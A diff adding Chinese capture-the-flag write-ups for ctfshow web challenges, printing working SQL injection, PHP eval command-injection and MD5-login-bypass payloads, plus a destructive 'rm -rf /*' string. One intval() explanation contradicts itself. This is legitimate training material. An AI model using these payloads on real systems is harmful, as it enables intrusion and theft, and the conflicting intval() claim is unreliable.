@@ -4888,6 +4888,275 @@ ctfshow{d1cd60d9-6ef5-43de-ae59-a99e56777282} from flask import request cmd: str
 
 ------
 
+### 萌新杯web7
+
+> 阿呆得到最高指示，如果还出问题，就卷铺盖滚蛋，阿呆心在流血。
+
+靶机给出的源码如下：
+
+```php+HTML
+<html>
+<head>
+    <title>ctf.show萌新计划web1</title>
+    <meta charset="utf-8">
+</head>
+<body>
+<?php
+# 包含数据库连接文件
+include("config.php");
+# 判断get提交的参数id是否存在
+if(isset($_GET['id'])){
+    $id = $_GET['id'];
+    if(preg_match("/\'|\"|or|\||\-|\\\|\/|\\*|\<|\>|\^|\!|\~|x|hex|\(|\)|\+|select/i",$id)){
+        die("id error");
+    }
+    # 判断id的值是否大于999
+    if(intval($id) > 999){
+        # id 大于 999 直接退出并返回错误
+        die("id error");
+    }else{
+        # id 小于 999 拼接sql语句
+        $sql = "select * from article where id = $id order by id limit 1 ";
+        echo "执行的sql为：$sql<br>";
+        # 执行sql 语句
+        $result = $conn->query($sql);
+        # 判断有没有查询结果
+        if ($result->num_rows > 0) {
+            # 如果有结果，获取结果对象的值$row
+            while($row = $result->fetch_assoc()) {
+                echo "id: " . $row["id"]. " - title: " . $row["title"]. " <br><hr>" . $row["content"]. "<br>";
+            }
+        }
+        # 关闭数据库连接
+        $conn->close();
+    }
+}else{
+    highlight_file(__FILE__);
+}
+
+?>
+</body>
+<!-- flag in id = 1000 -->
+</html>
+```
+
+首先PHP代码审计。
+
+过滤规则把很多SQL注入常用的关键字给过滤掉了（如 `'`, `"`, `or`, `select`, `+`, `(`, `)` 等），但是没有过滤空格、数字、字母（除x和hex外）和点、进制前缀等。
+
+```php
+if(preg_match("/\'|\"|or|\||\-|\\\|\/|\\*|\<|\>|\^|\!|\~|x|hex|\(|\)|\+|select/i",$id)){
+    die("id error");
+}
+```
+
+使用 `intval($id)` 转成整数后判断是否 > 999。如果大于 999，就报错退出。但需要注意`intval()` 对某些字符串的处理有“进制识别”特性！
+
+```php
+if(intval($id) > 999){
+    die("id error");
+}
+```
+
+- `$id` 直接拼接到 SQL 中，所以我们能传入一个合法的数字表达式来绕过过滤。
+
+```php
+$sql = "select * from article where id = $id order by id limit 1 ";
+```
+
+最后的注释提示我们`flag`在`id = 1000`的记录中，但`intval($id) > 999`貌似会阻止直接传入`1000`。
+
+```php
+echo intval("0b1111101000");  // 输出 1000
+```
+
+然而，`intval()` 在PHP<8.0中对二进制值`0b...`的处理方式不同。`intval("0b1111101000")`**返回 0**，因为 `intval()` 不会解析二进制/十六进制字符串，它只认十进制数字开头的字符串。从左到右读，遇到非数字字符就停。所以`0b...` 中的 `b` 不是二进制的数字，结果取值为`0`。
+
+```php
+intval("0b1111101000") === 0   // 在 PHP 7.x 及更早版本中成立！
+```
+
+虽然 `intval($id)`在PHP<8版本的返回值为0，但`SQL`语句用的是原始 `$id` 字符串！
+
+```sql
+$sql = "select * from article where id = 0b1111101000 order by id limit 1 ";
+```
+
+`MySQL`会把`0b1111101000`解析为 **十进制 1000**，所以最终查询的是 `id = 1000` 的记录 → 拿到 flag！
+
+```sql
+执行的sql为：select * from article where id = 0b1111101000 order by id limit 1
+id: 1000 - title: CTFshowflag
+ctfshow{525d2c1c-64fa-4987-a77f-4b14229ffdc7}
+```
+
+提交`ctfshow{525d2c1c-64fa-4987-a77f-4b14229ffdc7}`即可。
+
+------
+
+### 萌新杯web8
+
+> 阿呆熟悉的一顿操作，去了埃塞尔比亚。（配图是MySQL从删库到跑路）
+
+靶机给出的源码如下：
+
+```php+HTML
+<html>
+<head>
+    <title>ctf.show萌新计划web1</title>
+    <meta charset="utf-8">
+</head>
+<body>
+<?php
+# 包含数据库连接文件,key flag 也在里面定义
+include("config.php");
+# 判断get提交的参数id是否存在
+if(isset($_GET['flag'])){
+    if(isset($_GET['flag'])){
+        $f = $_GET['flag'];
+        if($key===$f){
+                echo $flag;
+        }
+    }
+}else{
+    highlight_file(__FILE__);
+}
+
+?>
+</body>
+</html>
+```
+
+当`GET`传递的参数`flag`与`key`值相等时，输出`flag`变量的值。
+
+由题目描述可知阿呆已经删库跑路了。`rm -rf /*`是`Linux`中的一条指令，`/*`代表根目录下所有路径，作用是删除根目录下所有文件，也就是删除系统中的所有文件。
+
+构造`GET`请求`/?flag=rm%20-rf%20/*`，拿到`ctfshow{0b06622e-4912-4d04-9ad7-c706fdd5a602}`。
+
+------
+
+### 萌新杯web9
+
+PHP代码审计题，靶机给出的页面如下：
+
+```php
+<?php
+# flag in config.php
+include("config.php");
+if(isset($_GET['c'])){
+    $c = $_GET['c'];
+    if(preg_match("/system|exec|highlight/i",$c)){
+            eval($c);
+    }else{
+        die("cmd error");
+    }
+}else{
+    highlight_file(__FILE__);
+}
+?>
+```
+
+源码中允许使用`system`，`exec`，`highlight`这三个常用的`PHP`命令执行函数，满足`preg_match()`的匹配条件才可以使用`eval()`函数执行`PHP`代码。
+
+使用`ls`查看当前目录。
+
+```
+/?c=system(%27ls%27);
+```
+
+> config.php index.php
+
+`cat config.php`查看`config.php`内容。
+
+```
+/?c=system(%27cat%20config.php%27);
+```
+
+右键查看网页源代码，可以看到`config.php`中的`flag`变量。
+
+```php
+<?php
+$flag = "ctfshow{81eca3d8-55ab-4ca4-b6ef-8bc964345dc6}";
+?>
+```
+
+或者用`tac config.php`直接显示`config.php`的内容。
+
+```
+/?c=system(%27tac%20config.php%27);
+```
+
+> ?> $flag = "ctfshow{81eca3d8-55ab-4ca4-b6ef-8bc964345dc6}";
+
+或者用`highlight_file('config.php')`直接查看`config.php`文件。
+
+```
+/?c=highlight_file(%27config.php%27);
+```
+
+这样也能直接看到`config.php`中的`flag`变量。
+
+```php
+<?php
+$flag = "ctfshow{81eca3d8-55ab-4ca4-b6ef-8bc964345dc6}";
+?>
+```
+
+提交`ctfshow{81eca3d8-55ab-4ca4-b6ef-8bc964345dc6}`即可。
+
+------
+
+### 萌新杯web10
+
+PHP代码审计题，靶机给出的页面如下：
+
+```php
+<?php
+# flag in config.php
+include("config.php");
+if(isset($_GET['c'])){
+    $c = $_GET['c'];
+    if(!preg_match("/system|exec|highlight/i",$c)){
+            eval($c);
+    }else{
+        die("cmd error");
+    }
+}else{
+    highlight_file(__FILE__);
+}
+?>
+```
+
+源码中过滤了含有`system`，`exec`，`highlight`这三个常用关键字的`PHP`命令执行函数，我们仍然可以使用没被过滤的命令执行函数`passthru()`，绕过过滤条件就可以使用`eval()` 函数执行`PHP`代码了。
+
+`passthru`与`system`的区别在于，`passthru`直接将结果输出到浏览器，不需要使用`echo`或`return`来查看结果，不返回任何值，且其可以输出二进制，比如图像数据。
+
+使用`ls`查看当前目录。
+
+```
+/?c=passthru(%27ls%27);
+```
+
+> config.php index.php
+
+根据注释，使用`cat config.php`查看含有`flag`的`config.php`内容。
+
+```
+/?c=passthru(%27cat%20config.php%27);
+```
+
+靶机显示空白页面，右键查看网页源代码，可以看到`flag`变量。
+
+```php
+<?php
+$flag = "ctfshow{cba00859-d2ff-404d-a9bb-7e6510444a28}";
+?>
+```
+
+提交`ctfshow{cba00859-d2ff-404d-a9bb-7e6510444a28}`即可。
+
+------
+
 ### web1
 
 进入靶机后看到一行信息：where is flag?
@@ -5556,6 +5825,147 @@ for num in range(1,60):
 ```
 
 提交`ctfshow{4b9aaea6-cf3c-43b9-a3d7-4269b3d4b8ba}`即可。
+
+------
+
+### web9
+
+靶机给了个能输入账号和密码的登录框。`dirsearch -u`发现靶机存在`/robots.txt`文件，内容如下：
+
+```
+User-agent: *
+Disallow: /index.phps
+```
+
+访问`/index.phps`，将其下载至本地，其内容如下：
+
+```php
+<?php
+    $flag="";
+    $password=$_POST['password'];
+    if(strlen($password)>10){
+        die("password error");
+    }
+    $sql="select * from user where username ='admin' and password ='".md5($password,true)."'";
+    $result=mysqli_query($con,$sql);
+    if(mysqli_num_rows($result)>0){
+        while($row=mysqli_fetch_assoc($result)){
+             echo "登陆成功<br>";
+             echo $flag;
+         }
+    }
+?>
+```
+
+分析代码：①从POST请求中获取一个名为'password'的参数。②检查密码长度是否大于10，若大于10，则输出"password error"并终止脚本。③构造一个SQL查询语句，查询user表中username为'admin'且password等于`md5($password, true)`的结果。注意⚠`md5($password, true)`中的第二个参数设置为true，这意味着md5函数返回原始二进制格式（16字节），而不是通常的32字符十六进制字符串。这个二进制数据可能会在拼接进SQL语句时产生问题，因为其中可能包含特殊字符，如单引号等。④执行查询，如果查询返回的行数大于0（即找到了匹配的用户），则输出"登陆成功"和`$flag`。
+
+由于`SQL`语句中使用了`md5()`函数加密，我们可以利用`MD5`加密漏洞来绕过。
+
+在密码框中输入`ffifdyop`，即可登录成功，得到`flag`。这是因为`ffifdyop`的`MD5`加密结果是 `276f722736c95d99e921722cf9ed621c`，当该值被放入SQL查询语句时，会被解码为字符串，由于其中有`'or'`，并且后面有字符，所以会形成一个永真条件。可以用`python`来看一下：
+
+```python
+>>> import hashlib
+>>> md5 = hashlib.md5()
+>>> md5.update('ffifdyop'.encode('utf-8'))
+>>> md5.hexdigest()
+'276f722736c95d99e921722cf9ed621c'
+>>> bytes.fromhex(md5.hexdigest())
+b"'or'6\xc9]\x99\xe9!r,\xf9\xedb\x1c"
+```
+
+输入账号`admin`及密码`ffifdyop`后登录成功，即可拿到`flag`。
+
+> 登陆成功
+> ctfshow{020323d0-94de-405b-addd-df1fb64bcd07}
+
+提交`ctfshow{020323d0-94de-405b-addd-df1fb64bcd07}`即可。
+
+------
+
+### web10
+
+进入靶机后看到一个能输入账号和密码的登录框。右键查看源码，貌似没有什么特别之处。
+
+```html
+<html lang="zh-CN">
+<head>
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
+    <meta name="viewport" content="width=device-width, minimum-scale=1.0, maximum-scale=1.0, initial-scale=1.0" />
+    <title>ctf.show_web10</title>
+	<script src="style.css"></script>
+</head>
+<body>
+    <center>
+    <h2>ctf.show_web10</h2>
+    <hr>
+		<h3>管理员认证</h3>
+		<form method="post">
+			用户名：<input type="text" name="username"></br></br>
+			密&nbsp;&nbsp;&nbsp;码：<input type="password" name="password"></br>
+			<input type="submit" value="登陆">
+			<input type="button" onclick="cancel()" value="取消">
+		</form>
+	    </center>
+</body>
+</html>
+```
+
+网页除了登录按钮以外，还有一个取消按钮。手贱点击取消，好家伙，居然下载了文件`index.phps`。
+
+这是为啥？原来`style.css`中包含了`js`代码。
+
+```javascript
+function cancel(){
+	window.location='index.phps';	
+}
+```
+
+而`index.phps`的源码如下：
+
+```php
+<?php
+    $flag="";
+    function replaceSpecialChar($strParam){
+         $regex = "/(select|from|where|join|sleep|and|\s|union|,)/i";
+         return preg_replace($regex,"",$strParam);
+    }
+    if (!$con)
+    {
+        die('Could not connect: ' . mysqli_error());
+    }
+    if(strlen($username)!=strlen(replaceSpecialChar($username))){
+        die("sql inject error");
+    }
+    if(strlen($password)!=strlen(replaceSpecialChar($password))){
+        die("sql inject error");
+    }
+    $sql="select * from user where username = '$username'";
+    $result=mysqli_query($con,$sql);
+    if(mysqli_num_rows($result)>0){
+        while($row=mysqli_fetch_assoc($result)){
+            if($password==$row['password']){
+                echo "登陆成功<br>";
+                echo $flag;
+            }
+         }
+    }
+?>
+```
+
+`SQL`注入攻击常见的关键词被过滤得差不多了，而且双写过滤也被限制了。
+
+`group by`可以将结果集中的数据行根据选择列的值进行逻辑分组。在`group by`后添加`with rollup`，表示在进行分组统计的基础上再次进行汇总统计。结果中将会多出一行，其中`password`列为`NULL`，`count(*)`为统计和。因为添加`with rollup`语句后，`password`中有一条数据为`NULL`，我们只要输入空密码使得`NULL==NULL`成立，即可绕过`$password==$row['password']`的限制成功登录。
+
+用`HackBar`构造`POST`请求，向靶机发送的数据如下：
+
+```
+username=admin'/**/or/**/1=1/**/group/**/by/**/password/**/with/**/rollup#&password=
+```
+
+> 登陆成功
+> ctfshow{6e86801f-54fd-4a51-93ec-e80d835d8041}
+
+提交`ctfshow{6e86801f-54fd-4a51-93ec-e80d835d8041}`即可。
 
 ------
 
